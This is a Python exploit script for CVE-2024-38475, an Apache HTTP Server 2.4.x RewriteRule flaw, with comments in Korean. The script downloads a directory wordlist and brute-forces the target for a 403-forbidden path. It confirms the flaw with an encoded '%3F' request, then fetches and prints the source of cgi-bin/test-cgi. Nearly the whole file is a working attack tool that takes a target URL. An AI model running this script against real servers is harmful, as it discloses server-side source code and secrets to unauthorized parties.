#! /usr/bin/python3
# CVE-2024-38475
# Apache HTTP Server Source Disclosure Vulnerability
# version : 2.4.0~2.4.59
# version(reg) : ^2\.4\.(0|[1-5]?[0-9])$

import requests
import argparse
import time
import os

print('''======================================\n            CVE-2024-38475\n Apache HTTP Server Source Disclosure\n======================================''')

parser = argparse.ArgumentParser(description="Usage: python3 CVE-2024-38475.py -u http://172.22.111.12:8080")
parser.add_argument('--URL', '-u', required=False, help='Target URL (e.g., http://172.22.111.12:8080)')
args = parser.parse_args()


def download_wordlist():
    filename="Directories_All.wordlist"

    if os.path.exists(filename): return True
    
    try:
        #403 디렉토리를 찾는 데 사용될 wordlist 다운로드 
        response = requests.get("https://github.com/emadshanab/WordLists-20111129/raw/refs/heads/master/Directories_All.wordlist", stream=True)
        response.raise_for_status()

        print(f"[+] download {filename} ...")

        with open(filename, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)

        print(f"[+] File downloaded successfully as '{filename}'\n")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error downloading the file: {e}")



def read_dir_list():
    download_wordlist()

    with open(f"Directories_All.wordlist", 'r') as file:
        return [line.strip() for line in file.readlines()]


def find_403_dir(URL):
    dir_list = read_dir_list()
    for dir in dir_list:
        try:
            response = requests.get(f"{URL}/{dir}/")
            if response.status_code == 403:
                print(f"[+] Found 403 Forbidden directory: {dir}")
                return dir
        except requests.exceptions.RequestException as e:
            print(f"[-] Error with directory: {dir} - {e}")
            print(f"[-] Detected Vulnerability : False")
            return None

    print(f"[-] not Found 403 Forbidden directory")
    print(f"[-] Detected Vulnerability : False")
    exit(1)


def Detected_Vulnerability(URL, forbidden_url):
    # 일반 요청과 악성 요청의 결과가 동일하다면 RewriteRule 취약점으로 판단 
    normal = f"{URL}/{forbidden_url}/index"
    malicious = f"{URL}/{forbidden_url}/index.html%3F"

    res = requests.get(normal)
    if res.status_code == 200:

        res2 = requests.get(malicious)
        if res2.status_code == 200:
            print(f"[*] Detected Vulnerability : True")
            print("-----------------------------------")
            return True
        else:
            print(f"[-] RewriteRule not utilized"); 
            print(f"[-] Detected Vulnerability : False")
            return False
    else:
        print(f"[-] RewriteRule not utilized"); 
        print(f"[-] Detected Vulnerability : False")
        return False


def exploit(URL, forbidden_url):
    #target file : cgi-bin/test-cgi
    payload = f"{URL}/{forbidden_url}/usr/local/apache2/cgi-bin/test-cgi%3F"
    res = requests.get(payload)
    if res.status_code == 200:
        print(f"[+] cgi-bin/test-cgi - Source Disclosure Vulnerability >> {payload}")

        print(res.text)

    else:
        print(f"[-] RewriteRule not used for CGI script.")


if __name__ == "__main__":
    
    URL= args.URL if args.URL else "http://localhost:8080"

    forbidden_url = find_403_dir(URL)

    if Detected_Vulnerability(URL, forbidden_url):
        exploit(URL, forbidden_url)